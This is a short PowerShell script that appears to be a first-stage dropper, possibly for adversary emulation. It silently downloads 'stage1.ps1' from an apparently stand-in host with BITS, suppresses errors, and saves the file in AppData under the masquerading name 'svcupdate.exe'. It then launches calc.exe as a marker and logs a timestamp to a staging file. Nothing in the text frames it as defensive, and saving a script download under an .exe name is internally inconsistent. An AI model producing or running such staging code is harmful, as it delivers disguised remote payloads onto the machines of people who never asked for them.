[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://adatum.com/stage1.ps1",
    [string]$OutputPath = "$env:APPDATA\svcupdate.exe",
    [int]$RequestTimeout = 229
)
Start-BitsTransfer -Source $PayloadUrl -Destination $OutputPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
